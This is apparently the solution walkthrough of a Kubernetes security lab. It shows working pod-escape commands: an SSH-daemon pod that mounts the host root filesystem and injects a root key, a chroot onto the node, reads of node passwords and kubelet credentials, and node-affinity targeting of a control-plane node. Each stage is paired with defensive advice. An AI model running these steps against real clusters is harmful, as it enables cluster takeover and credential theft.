# Solution

* [Execute onto the Pod (RCE)](#execute-onto-the-pod-(rce))
  * [How could this have been avoided?](#how-could-this-have-been-avoided?)
  * [Is this part realistic?](#is-this-part-realistic?)
  * [Best Practices to Consider](#best-practices-to-consider)
* [Check Permissions](#check-permissions)
  * [How could this have been avoided?](#how-could-this-have-been-avoided?)
  * [Is this part realistic?](#is-this-part-realistic?)
  * [Best Practices to Consider](#best-practices-to-consider)
* [Take a Moment to Think](#take-a-moment-to-think)
* [Lateral Movement](#lateral-movement)
  * [How could this have been avoided?](#how-could-this-have-been-avoided?)
  * [Is this part realistic?](#is-this-part-realistic?)
  * [Best Practices to Consider](#best-practices-to-consider)
* [Vertical Movement](#vertical-movement)
  * [How could this have been avoided?](#how-could-this-have-been-avoided?)
  * [Is this part realistic?](#is-this-part-realistic?)
  * [Best Practices to Consider](#best-practices-to-consider)
* [Post Exploitation](#post-exploitation)

## Execute onto the Pod (RCE)

This is the first step of the "attack". We are assuming that we have a RCE vulnerability in the
`vulnerable-app` pod. As working via such a vulnerability can be a pain in the a$$, I simply give
you rights to open a shell in the container, which has the same effect without the hassle. Execute
in to the container:

```bash
kubectl -n pwn-me exec -it vulnerable-app -- sh
```

### How could this have been avoided?

Well obviously not having the RCE vulnerability in the application would help. However, note that if
such a RCE is present, the attacker is at first constrained to the applications that are provided in
the container. In our case, this is nearly a full OS. This gives us a lot of freedom. If the
container should have been fully empty, we would have been stuck already here...

### Is this part realistic?

This is an extremely realistic scenario. RCEs are surprisingly common considering the complexity of
the bugs they require. Moreover, that the container contains a lot of bloat, such a shell and
package managers is extremely common. Most developers are not aware of Cloud Native development best
practices and do not strip their containers, or use multi stage builds. Moreover, with the migration
of many Spring Boot applications into the cloud, containers are actually required to contain a great
amount of OS level dependencies (no shell though). All in all this is as realistic as it gets.

### Best Practices to Consider

Protect yourself against RCE via better coding practices in general. This includes static and
dynamic code scanning, code reviews, pair programming, and simply not letting less-educated
developers program critical components which have a lot of external exposure.

To reduce the impact of the RCE, you can strip your containers as much as possible. For instance, in
scenario 01, you build a container that contains absolutely nothing other than the statically
compiled Golang binary. This makes it nearly impossible for an attacker to do anything with the
container, other than somehow exploit other application vulnerabilities: (s)he cannot execute any
other programs, open shells, make network calls, perform service discovery, ..., nothing really.

## Check Permissions

<details>
  <summary>Tip<summary>

Permissions can be checked with `kubectl auth can-i ...`. In order to perform this you might need to
install `kubectl` though, or figure out the exact REST API call that can perform the same (I don't
recommend trying this, it is quite some work, and installing `kubectl` takes about 30 seconds).

</details>

<details>
  <summary>Solution<summary>

We want to check what we are allowed to do with the Kubernetes API within the pod. This is always
the first thing to check because it offers the largest attack surface.

Feel free to investigate the pod more, in general it might offer you some more information about the
application running in it, and might expose other vulnerabilities. In this case, the "application"
is simply an infinite `sleep` command, and the container is super boring (standard Alpine Linux
container).

In order to check the permissions, we will simply install `kubectl` to perform all calls against the
Kubernetes API. That way we do not need to worry about authentication, etc.

`kubectl` is a static binary that can simply be downloaded. I like to download stuff via `curl`,
which will also need to be installed. To get `kubectl` as a binary into your `PATH`, I used:

```bash
# get kubectl
apk update
apk add curl
curl -LO https://dl.k8s.io/release/v1.22.0/bin/linux/amd64/kubectl
chmod u+x kubectl
mv kubectl /usr/bin
```

Now I want to find out in what namespace I landed:

```
~ # cat /run/secrets/kubernetes.io/serviceaccount/namespace
pwn-me
```

Note that this file is always mounted automatically by Kubernetes and will be present in all
containers by default. You will note that other files are also present under:
`/run/secrets/kubernetes.io/serviceaccount`. These files will now automatically be used when we
execute `kubectl` to authenticate against the Kubernetes API with the identity of the pod. Isn't
this great?

<details>
  <summary>For instance to show the Certificate Authority to verify the Kubernetes API certificate:</summary>

```
/ # cat /run/secrets/kubernetes.io/serviceaccount/ca.crt
-----BEGIN CERTIFICATE-----
MIIBdzCCAR2gAwIBAgIBADAKBggqhkjOPQQDAjAjMSEwHwYDVQQDDBhrM3Mtc2Vy
dmVyLWNhQDE2MjkzMDU2NzkwHhcNMjEwODE4MTY1NDM5WhcNMzEwODE2MTY1NDM5
WjAjMSEwHwYDVQQDDBhrM3Mtc2VydmVyLWNhQDE2MjkzMDU2NzkwWTATBgcqhkjO
PQIBBggqhkjOPQMBBwNCAATMe84cAtbDyRVYvpFecgy7p9Xd3jzd/D3A60zncCVo
qSswpRvwHAHjQ/w1hA0tLOawNPjnb9M50jkyfZPPakoNo0IwQDAOBgNVHQ8BAf8E
BAMCAqQwDwYDVR0TAQH/BAUwAwEB/zAdBgNVHQ4EFgQUd27CvvSGZwaOxvdY07hw
4Y/m2IIwCgYIKoZIzj0EAwIDSAAwRQIhAIdZaxyzVs0LPUUYlId7tgT+/PYTrqJi
Y2lOgA5i306WAiAssk+geIwESF5566ed+y1mHONPWZLs+AY2JhPoIg4cjg==
-----END CERTIFICATE-----
```

</details>

Ok, so what is the pod allowed to perform within the namespace it is placed in?:

```
~ # kubectl auth can-i --list --namespace=pwn-me
Resources                                       Non-Resource URLs                     Resource Names   Verbs
pods                                            []                                    []               [create list get delete]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

The first line is the important one: we can create, delete, get, and list pods in our namespace.

</details>


### How could this have been avoided?

<details>
  <summary>Show</summary>

You can tell Kubernetes to not mount service accounts by default. However, in this case, you could
assume that the application needs to be able to create pods for some reason. In such a case, it is
unavoidable to have such a service account with the permissions to access the API.

</details>

### Is this part realistic?

<details>
  <summary>Show</summary>

Totally. While it is true that most applications that typically run on Kubernetes do not need to
access the Kubernetes API, and therefore do not have many permissions, some still do.

</details>

### Best Practices to Consider

<details>
  <summary>Show</summary>

Try to contain your applications that access the Kubernetes API to internal services, not
applications that are exposed outside the cluster. Moreover, always follow the principle of least
privilege when providing permissions to service accounts to applications. Actually, follow the
principle of least privilege everywhere at all times.

</details>

## Take a Moment to Think

<details>
  <summary>Potential line of thinking</summary>

Ok so we are allowed to list, get, delete, and create pods in the current namespace. Our current
pod/container is pretty useless otherwise. What can we do?

First remember our objective: take over the cluster.

We should be aware, that the nodes the cluster runs on, especially master (control-plane) nodes
typically have elevated privileges in order to perform setup actions, etc. Therefore, if we manage
to escape onto such a node, we would nearly be done. But how can we achieve this by simply creating,
listing, and getting pods?

Well, one famous container escape technique, and a surprisingly simple one, is to mount the entire
node filesystem into a pod, and then `chroot`ing into its filesystem. Now we have 3 challenges:

1. Create a pod that contains a nodes entire filesystem. This should be easy considering we are
   allowed to create pods.
2. `chroot` into the filesystem. This is not that simply, since we can create the pod, but not
   execute any commands in it (cannot exec into the pod via Kubernetes API).
3. Ensure that the created pod ideally lands on a master node.

For step 2, we can perform a workaround. How can we exec into the pod you may ask? Ever heard of
SSH? We can "simply" start a SSH daemon in the container, and then ssh into it. That way we don't
pass via the Kubernetes API, and everything is fine. Note that setting this up might prove a little
bit of trying stuff out, you will see later.

For the third step, we have a potential issue. Many clusters do not allow to schedule pods onto
their master nodes. However, many also do. Therefore we can still try. In order to schedule it on
such a node, there are two possibilities:

- Create more and more pods until on gets scheduled on a master node. This is not ideal as it might
  require you to create _a lot_ of pods before you get lucky. Clusters can have thousands of worker
  nodes for only 3 or 5 master nodes. Good luck my friend. Moreover it makes your attack way more
  visible. Finally, many clusters, while allowing to schedule pods on master nodes, will only do so
  when specifically told to.
- Use NodeAffinities to force scheduling onto a master node. This is very elegant, but requires more
  knowledge of the cluster, as we don't know the name of the master nodes, etc. We will see in a
  second how to do this.

The potential road blocks of such an attack scenario will be listed in the individual sections
below. Of course, it is best to already think of them here if you have experience, so that you have
several attack plans, and know when it gets dangerous because you are triggering cluster defense
mechanisms, or perform actions that increase your visibility.

</details>

## Lateral Movement

<details>
  <summary>Tip 1</summary>

Do not worry about the node you get scheduled on for now. Only create the pod which contains the SSH
daemon and mounts the filesystem. For this try to use the `panubo/sshd:latest` image and configure
the host filesystem mount with a `hostPath`.

</details>

<details>
  <summary>Tip 2</summary>

In order to get the SSH daemon to work and allow you to connect to it, you will need to create a SSH
key and register it as a authorized keys in the daemon. Moreover, ensure you can connect as `root`,
to have as many permission as possible.

Once you have created you SSH key, you can use the following pod definition to create the pod
(remember to use the key you generated).

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: sshd
  namespace: pwn-me
spec:
  containers:
  - env:
    - name: SSH_ENABLE_ROOT
      value: "true"
    image: panubo/sshd:latest
    imagePullPolicy: IfNotPresent
    name: sshd
    command:
    - sh
    - -c
    - "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDFIy6GD+SqVUI1JbAqatWSej/DGOAtm7kPBDSTs+aPUbIb72c/UFk4EtQSjuCCByncCBDmp4pfFpbPQZpjiQ0Nb/0MxdjET0ZM+2gd5ZSyDjp+ywlohva560xtkde6BD5zQkE9EB8Xo0fb530Ji/YKh3GRIILZYE5QN+ii/dC0Oxh+ZtmEvaUHJs/Ett//ZIG3+lZtaE0sRhZPn971a+AoPmtTOXrsgCSKW2ivT/HuXRvFHKuMj+9wDQELIJpDryAmL/evumy2J7/vdnKeUFAvmL1VCvJ4fPxSqR1+kVlZYOiIpnbiOkx8IcyV6EXvmBpo+EH20WTEQjYPIe3WFh+7I7yWbUg8YcPXx8+oYgELhgmchRXGGkV07e3vIV+okR3skYPMr6wLfhsfDhQ8sSSRvjewf8aanWvHb5+nA/pwZY1XBbBjh2UxyWjRquwwtjyDWdApcgmpkewpS8JabzWkTAUE76MLV9rrvsWYlPKRDJXqPCuLJ11q/LS6+ImXo0y3Eszxdq3eoYofq6W9FhmnKmis/21hbkLodHZUh/i2amFLb8J53DslRcdCkeoGe+/hpmwIh/kb25mihumCJ8pbILwM1jfQx7fGi9I/vgwZk8d+QP8jlmyYuF4JO+wTRmTPCxy07pnYBEyK01EomfOKTPjixueoMKIpxycnZFxAAQ== root@vulnerable-app' > /root/.ssh/authorized_keys && ./entry.sh /usr/sbin/sshd -D -e -f /etc/ssh/sshd_config"
    volumeMounts:
    - name: host-vol
      mountPath: /srv/host
  restartPolicy: Always
  volumes:
  - name: host-vol
    hostPath:
      path: /
      type: Directory
```

</details>

<details>
  <summary>Solution</summary>

I will first investigate what SSH daemon image there are that I can use. I decided on
`panubo/sshd:latest` because it seems simple enough and therefore is easily "hackable".

The image is meant to be used with configuration maps or secrets to allow authentication mounts. We
are not allowed to create ConfigMaps or Secrets in Kubernetes, and therefore cannot use this way. In
order to still use the image, I inspect it to find out what `ENTRYPOINT` and `CMD` it uses, so I can
inject my information and then execute the image as it would normally:

> Note I execute this in my VM, `docker` is not installed in the container and this is only to
> gather information. I could execute this anywhere.

```
$ docker pull panubo/sshd:latest
$ docker inspect panubo/sshd:latest
...<redacted>...
            "Cmd": [
                "/bin/sh",
                "-c",
                "#(nop) ",
                "CMD [\"/usr/sbin/sshd\" \"-D\" \"-e\" \"-f\" \"/etc/ssh/sshd_config\"]"
            ],
            "Image": "sha256:4532b1f9f87c183e6ca9284db1e5006dbc8be65a6f197e10971cacbea81a429b",
            "Volumes": null,
            "WorkingDir": "",
            "Entrypoint": [
                "/entry.sh"
            ],
...<redacted>...
```

As we can see, the entire command it uses is:

```bash
./entry.sh /usr/sbin/sshd -D -e -f /etc/ssh/sshd_config
```

Now we will need to register a SSH key before starting the daemon. First, we need such a key (in the
vulnerable container):

```bash
# install ssh client
apk add openssh
# generate strong key (press enter without any other input on all prompts)
ssh-keygen -t rsa -b 4096
```

Once the key is generated, we can read it:

```
~ # cat /root/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDCrOtrfVoiRaIczi0SrC08YoDwgPXMCCOs2BrHNVFotnNCRsCoJOfrUZpQcXPn3H1LlhFJAgHYPKibAXzSiSHG/l7imL/tbf+lLZkLx/U96TyFpUAXyi9/yjif2nMM2LtwOAZDH7JzPVbCDAbQUhZwkWnkSQ95pLJtp3XTnbywRsjbI6q3ADurjQF9BjqAhnQfj/+rNaaCQwjaVX3BQboxmquK4Klk40sdMfRLMo69Xm51AqqxqmVD1L5ZWL8YsWxYzuLmJ/EmVA0NbX3GByTgz6zQxcRkdXC3xpdVPecfiqofMgDR+5mlqXLI+zBhWDP901MbaKjnYePKwGVTo4qOmfi4qB3g6Dkc2FpS/L8xNS8Zt2aM+o6vdVx98Hjmw8xVGwV8brhgWd8tGP9qNbSLT8riKJBABXh/5xDoGVtepqRwGu+gQf/uC8CBznDkoxxakzTpngiii4Wc4kbrsVCs7fq8MRt1nANqm089Ewo7k+9yqIWYFzGUUhVRLX/KxUMsf2kC/uz6KIUmzWrhcvxb3s9rg3qOvQnIxsxgiY+0jMXXVtcRHzmDStBE13AKRmKfEG7ec/mDAa/N/o79wph+SrQYJqxF87FawBI19fy3rAi0l8tnhcnal80G9XNkA6TzwooBNU85ZtOYsHCXP3PA8FQ2tDlYeE4PkB37N6ilkw== root@vulnerable-app
```

Now to authorize this key, it needs to be written into `/root/.ssh/authorized_keys` to authorize us
as `root`. Therefore I want to the command of the container to be:

```bash
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDFIy6GD+SqVUI1JbAqatWSej/DGOAtm7kPBDSTs+aPUbIb72c/UFk4EtQSjuCCByncCBDmp4pfFpbPQZpjiQ0Nb/0MxdjET0ZM+2gd5ZSyDjp+ywlohva560xtkde6BD5zQkE9EB8Xo0fb530Ji/YKh3GRIILZYE5QN+ii/dC0Oxh+ZtmEvaUHJs/Ett//ZIG3+lZtaE0sRhZPn971a+AoPmtTOXrsgCSKW2ivT/HuXRvFHKuMj+9wDQELIJpDryAmL/evumy2J7/vdnKeUFAvmL1VCvJ4fPxSqR1+kVlZYOiIpnbiOkx8IcyV6EXvmBpo+EH20WTEQjYPIe3WFh+7I7yWbUg8YcPXx8+oYgELhgmchRXGGkV07e3vIV+okR3skYPMr6wLfhsfDhQ8sSSRvjewf8aanWvHb5+nA/pwZY1XBbBjh2UxyWjRquwwtjyDWdApcgmpkewpS8JabzWkTAUE76MLV9rrvsWYlPKRDJXqPCuLJ11q/LS6+ImXo0y3Eszxdq3eoYofq6W9FhmnKmis/21hbkLodHZUh/i2amFLb8J53DslRcdCkeoGe+/hpmwIh/kb25mihumCJ8pbILwM1jfQx7fGi9I/vgwZk8d+QP8jlmyYuF4JO+wTRmTPCxy07pnYBEyK01EomfOKTPjixueoMKIpxycnZFxAAQ== root@vulnerable-app' > /root/.ssh/authorized_keys && ./entry.sh /usr/sbin/sshd -D -e -f /etc/ssh/sshd_config
```

This means that you pod definition is:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: sshd
  namespace: pwn-me
spec:
  containers:
  - env:
    - name: SSH_ENABLE_ROOT
      value: "true"
    image: panubo/sshd:latest
    imagePullPolicy: IfNotPresent
    name: sshd
    command:
    - sh
    - -c
    - "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDFIy6GD+SqVUI1JbAqatWSej/DGOAtm7kPBDSTs+aPUbIb72c/UFk4EtQSjuCCByncCBDmp4pfFpbPQZpjiQ0Nb/0MxdjET0ZM+2gd5ZSyDjp+ywlohva560xtkde6BD5zQkE9EB8Xo0fb530Ji/YKh3GRIILZYE5QN+ii/dC0Oxh+ZtmEvaUHJs/Ett//ZIG3+lZtaE0sRhZPn971a+AoPmtTOXrsgCSKW2ivT/HuXRvFHKuMj+9wDQELIJpDryAmL/evumy2J7/vdnKeUFAvmL1VCvJ4fPxSqR1+kVlZYOiIpnbiOkx8IcyV6EXvmBpo+EH20WTEQjYPIe3WFh+7I7yWbUg8YcPXx8+oYgELhgmchRXGGkV07e3vIV+okR3skYPMr6wLfhsfDhQ8sSSRvjewf8aanWvHb5+nA/pwZY1XBbBjh2UxyWjRquwwtjyDWdApcgmpkewpS8JabzWkTAUE76MLV9rrvsWYlPKRDJXqPCuLJ11q/LS6+ImXo0y3Eszxdq3eoYofq6W9FhmnKmis/21hbkLodHZUh/i2amFLb8J53DslRcdCkeoGe+/hpmwIh/kb25mihumCJ8pbILwM1jfQx7fGi9I/vgwZk8d+QP8jlmyYuF4JO+wTRmTPCxy07pnYBEyK01EomfOKTPjixueoMKIpxycnZFxAAQ== root@vulnerable-app' > /root/.ssh/authorized_keys && ./entry.sh /usr/sbin/sshd -D -e -f /etc/ssh/sshd_config"
    volumeMounts:
    - name: host-vol
      mountPath: /srv/host
  restartPolicy: Always
  volumes:
  - name: host-vol
    hostPath:
      path: /
      type: Directory
```

> Note that I mount the entire host filesystem (`/`) under `/srv/host`, and enable the `root`
> account SSH login with the `SSH_ENABLE_ROOT` environment variable (see image documentation).
>
> Moreover note that you technically don't need to expose the port of the container, as it is
> specified in the image. However, feel free to still do so.

I write this in a file `/tmp/pod.yaml`, and then create it:

```
/ # kubectl apply -f /tmp/pod.yml
pod/sshd created
```

Once I have done this, I want to connect to the pod using `ssh`. For this I need an IP:

```
/ # kubectl -n pwn-me get pods -o wide
NAME             READY   STATUS    RESTARTS   AGE     IP           NODE                            NOMINATED NODE   READINESS GATES
vulnerable-app   1/1     Running   0          3m11s   10.42.2.46   k3d-pipeline-cluster-agent-1    <none>           <none>
sshd             1/1     Running   0          20s     10.42.0.52   k3d-pipeline-cluster-agent-2    <none>           <none>
```

There I can see the IP address of my newly created `sshd` pod: `10.42.0.52`. Moreover, you can
already see here that the pod was scheduled on `k3d-pipeline-cluster-agent-2` node. I can `ssh` to
it:

```bash
# ssh onto the pod
ssh 10.42.0.52
```

From there, we want to escape onto the node:

```
sshd:~# chroot /srv/host/
```

Now you are the node!! Explore!!

What is the hostname?

```
sshd:/# cat /etc/hostname
k3d-pipeline-cluster-agent-2
```

> Note that you might get lucky and directly land on a master node. In which case you do not need to
> do the next part. However, if you land on any node containing `agent`, you are on a worker node.

What can I do with the Kubernetes API?

```
sshd:/# kubectl auth can-i --list -n pwn-me
The connection to the server localhost:8080 was refused - did you specify the right host or port?
```

What processes are running on the node?

```
sshd:/# ps auxwww
PID   USER     COMMAND
    1 0        /sbin/docker-init -- /bin/entrypoint.sh agent
    7 0        /bin/k3s agent
   29 0        containerd
  761 0        /bin/containerd-shim-runc-v2 -namespace k8s.io -id 7a8aec9336ae3ebb2d8429073baf0a0ccee0a6bb5deedd6a7208
  777 0        /bin/containerd-shim-runc-v2 -namespace k8s.io -id 6c013071d886130a0d1ac34fbdd6f7870d969326e19d2e902c4f
  825 0        /pause
  826 0        /pause
  944 0        {entry} /bin/sh /usr/bin/entry
  995 0        /bin/containerd-shim-runc-v2 -namespace k8s.io -id 1a8d2850d6241bc405d8e769ae85f97931c4ee695fe81c02d525
 1023 0        /pause
 1038 0        {entry} /bin/sh /usr/bin/entry
 1122 1001     /metrics-sidecar
 1328 1001     /dashboard --insecure-bind-address=0.0.0.0 --bind-address=0.0.0.0 --auto-generate-certificates --namesp
 2601 0        /bin/containerd-shim-runc-v2 -namespace k8s.io -id b4efd15ba36dd219e46a8dc287c151f55aa50c522def002cd07f
 2621 0        /pause
 2652 0        bash ./entry.sh /usr/sbin/sshd -D -e -f /etc/ssh/sshd_config
 2721 0        sshd: /usr/sbin/sshd -D -e -f /etc/ssh/sshd_config [listener] 0 of 10-100 startups
 4277 0        sshd: root@pts/0
 4279 0        -ash
 4310 0        /bin/ash -i
 6624 0        ps auxwww
```

> Note that you can find our pod's process on the node:
>
> ```
> sshd: /usr/sbin/sshd -D -e -f /etc/ssh/sshd_config [listener] 0 of 10-100 startups
> ```
>
> This is the `sshd` listener daemon running in pod `sshd`!


Note here the `/sbin/docker-init -- /bin/entrypoint.sh agent` and `/bin/k3s agent` processes! The
first has PID 1 which means it works as an init process. The second is the process that was launched
by the init process. `k3s` is a Kubernetes distribution, therefore this is the process running
Kubernetes on the node. This is what we are interested in.

Let us figure out what `k3s` can do:

```
sshd:/# k3s -h
NAME:
   k3s - Kubernetes, but small and simple

USAGE:
   k3s [global options] command [command options] [arguments...]

VERSION:
   v1.21.2+k3s1 (5a67e8dc)

COMMANDS:
   server         Run management server
   agent          Run node agent
   kubectl        Run kubectl
   crictl         Run crictl
   ctr            Run ctr
   etcd-snapshot  Trigger an immediate etcd snapshot
   help, h        Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --debug                     (logging) Turn on debug logs [$K3S_DEBUG]
   --data-dir value, -d value  (data) Folder to hold state default /var/lib/rancher/k3s or ${HOME}/.rancher/k3s if not root
   --help, -h                  show help
   --version, -v               print the version
```

Note how our hostname is `k3d-pipeline-cluster-agent-2` and `k3s` takes `agent` as an argument for
the worker node. It seems to take `server` as an argument to run master nodes, so a good guess for a
master node name would be `k3d-pipeline-cluster-server-0`. We will try this.

We could not try to find some more interesting data on the node before moving on, but would wouldn't
need to:

```
sshd:/# # find sensitive data such as this password
sshd:/# cat /etc/rancher/node/password
f9257fac6572145560669d61bce6e8fd

sshd:/# # you could look at container logs running on the node for interesting data
sshd:/# ls /var/log/pods/
kube-system_svclb-traefik-gnmrc_4e3c9f99-0102-4719-a357-19a32b72322f
kubernetes-dashboard_dashboard-metrics-scraper-5594697f48-zsxll_0b90a6fa-f7df-467c-8cc8-992bab5c4ddb
kubernetes-dashboard_kubernetes-dashboard-57c9bfc8c8-hvhm5_6d77f0fc-3d12-49ce-a80a-60cb7bd91f15
pwn-me_sshd_107d015a-e8b0-4820-a921-6ce0392669d8

sshd:/# search for kubernetes configurtions for interesting config data or certificates
sshd:/# find / -name *config* | grep kube
/var/lib/rancher/k3s/agent/kubeproxy.kubeconfig
/var/lib/rancher/k3s/agent/kubelet.kubeconfig
/var/lib/rancher/k3s/agent/k3scontroller.kubeconfig
find: ‘/proc/1/map_files’: Permission denied
find: ‘/proc/7/map_files’: Permission denied
find: ‘/proc/29/map_files’: Permission denied
find: ‘/proc/761/map_files’: Permission denied
find: ‘/proc/777/map_files’: Permission denied
find: ‘/proc/944/map_files’: Permission denied
find: ‘/proc/995/map_files’: Permission denied
find: ‘/proc/1038/map_files’: Permission denied
find: ‘/proc/1122/map_files’: Permission denied
find: ‘/proc/1328/map_files’: Permission denied
find: ‘/proc/2601/map_files’: Permission denied

sshd:/# # from the command above, there seems to be a lot of data in this directory
sshd:/# ls /var/lib/rancher/k3s/agent/
client-ca.crt              client-kube-proxy.key  etc                       pod-manifests
client-k3s-controller.crt  client-kubelet.crt     k3scontroller.kubeconfig  server-ca.crt
client-k3s-controller.key  client-kubelet.key     kubelet.kubeconfig        serving-kubelet.crt
client-kube-proxy.crt      containerd             kubeproxy.kubeconfig      serving-kubelet.key

sshd:/# # let's look at a config
sshd:/# cat /var/lib/rancher/k3s/agent/kubelet.kubeconfig
apiVersion: v1
clusters:
- cluster:
    server: https://127.0.0.1:6444
    certificate-authority: /var/lib/rancher/k3s/agent/server-ca.crt
  name: local
contexts:
- context:
    cluster: local
    namespace: default
    user: user
  name: Default
current-context: Default
kind: Config
preferences: {}
users:
- name: user
  user:
    client-certificate: /var/lib/rancher/k3s/agent/client-kubelet.crt
    client-key: /var/lib/rancher/k3s/agent/client-kubelet.key

sshd:/# # try to use the config? Unfortunately does not work ...
sshd:/# export KUBECONFIG=/var/lib/rancher/k3s/agent/kubelet.kubeconfig
sshd:/# kubectl cluster-info

To further debug and diagnose cluster problems, use 'kubectl cluster-info dump'.
The connection to the server 127.0.0.1:6444 was refused - did you specify the right host or port?

sshd:/# # find information on what technology the server is running (cri-o, flannel, etc)
sshd:/# ls /var/lib/rancher/k3s/agent/etc/
cni  containerd  crictl.yaml  flannel  k3s-agent-load-balancer.json
```

</details>

### How could this have been avoided?

<details>
  <summary>Show</summary>

Avoiding the lateral movement when someone has the rights to create pods is nearly impossible. Many
companies have their own container registries and do not allow to pull images from DockerHub as we
need. However, note that in every such company there are docker images with JVMs or Python installed
within that registry, which would allow us to build our own SSH daemon without any problem.
Therefore this would not stop up, just slow us down.

Avoiding the container escape is easier. Pods should generally not be allowed to mount host paths
into the container. This is nearly never required other than to install DaemonSets for cluster
monitoring, but those can be installed with elevated privileges by the cluster admins. Removing
such capabilities would have forbidden us to escape the container so easily. There are other
container escape possibilities, but these typically more complex, and are not guaranteed to work.

</details>

### Is this part realistic?

<details>
  <summary>Show</summary>

Yes this is fully realistic. As said above, many companies use their own registries. However, most
of these registries forward requests to DockerHub if an image is not found, and might only scan the
image for vulnerabilities before allowing it (and our SSH daemon image does not have any
vulnerabilities).

Regarding the host path mount: while true that some companies correctly block this, very few do.
Therefore it is fully realistic to believe that you can perform such an attack on an enterprise
cluster.

</details>

### Best Practices to Consider

<details>
  <summary>Show</summary>

- Disallow host path mounts generally.
- Potentially use closed registries for your clusters. However, this is extremely restrictive for
  developers, and therefore probably not worth the cost.

</details>

## Vertical Movement

<details>
  <summary>Tip</summary>

Nodes typically define the `kubernetes.io/hostname` label to define the name of the host of the
node. Use this with a node affinity to schedule the SSH daemon pod onto the
`k3d-pipeline-cluster-server-0` node.

</details>

<details>
  <summary>Solution</summary>

While we technically already performed vertical movement, we want to do this onto a control plane
node. The approach will be exactly the same, except we want to schedule the pod onto the
`k3d-pipeline-cluster-server-0` node.

> Note here that we are _guessing_ the hostname of the master node. However, it is a very educated
> guess based on the worker node name, and the names `k3s` likes to give to master workloads.
> However, it would be possible that this hostname actually does not refer to a master node, and we
> would need to perform more investigation.

In order to do this, we use the default `kubernetes.io/hostname` label, that is typically present on
Kubernetes node resources to specify the hostname they have (see [Kubernetes
documentation][hostname-docs]).

[hostname-docs]: https://kubernetes.io/docs/reference/labels-annotations-taints/#kubernetesiohostname

Therefore our pod resource becomes:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: sshd
  namespace: pwn-me
spec:
  containers:
  - env:
    - name: SSH_ENABLE_ROOT
      value: "true"
    image: panubo/sshd:latest
    imagePullPolicy: IfNotPresent
    name: sshd
    command:
    - sh
    - -c
    - "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDFIy6GD+SqVUI1JbAqatWSej/DGOAtm7kPBDSTs+aPUbIb72c/UFk4EtQSjuCCByncCBDmp4pfFpbPQZpjiQ0Nb/0MxdjET0ZM+2gd5ZSyDjp+ywlohva560xtkde6BD5zQkE9EB8Xo0fb530Ji/YKh3GRIILZYE5QN+ii/dC0Oxh+ZtmEvaUHJs/Ett//ZIG3+lZtaE0sRhZPn971a+AoPmtTOXrsgCSKW2ivT/HuXRvFHKuMj+9wDQELIJpDryAmL/evumy2J7/vdnKeUFAvmL1VCvJ4fPxSqR1+kVlZYOiIpnbiOkx8IcyV6EXvmBpo+EH20WTEQjYPIe3WFh+7I7yWbUg8YcPXx8+oYgELhgmchRXGGkV07e3vIV+okR3skYPMr6wLfhsfDhQ8sSSRvjewf8aanWvHb5+nA/pwZY1XBbBjh2UxyWjRquwwtjyDWdApcgmpkewpS8JabzWkTAUE76MLV9rrvsWYlPKRDJXqPCuLJ11q/LS6+ImXo0y3Eszxdq3eoYofq6W9FhmnKmis/21hbkLodHZUh/i2amFLb8J53DslRcdCkeoGe+/hpmwIh/kb25mihumCJ8pbILwM1jfQx7fGi9I/vgwZk8d+QP8jlmyYuF4JO+wTRmTPCxy07pnYBEyK01EomfOKTPjixueoMKIpxycnZFxAAQ== root@vulnerable-app' > /root/.ssh/authorized_keys && ./entry.sh /usr/sbin/sshd -D -e -f /etc/ssh/sshd_config"
    volumeMounts:
    - name: host-vol
      mountPath: /srv/host
  restartPolicy: Always
  affinity:
    nodeAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
        nodeSelectorTerms:
        - matchExpressions:
          - key: kubernetes.io/hostname
            operator: In
            values:
            - k3d-pipeline-cluster-server-0
  volumes:
  - name: host-vol
    hostPath:
      path: /
      type: Directory
```

If we try to apply this configuration:

```
/ # kubectl apply -f /tmp/pod.yml
Error from server (Forbidden): error when applying patch:
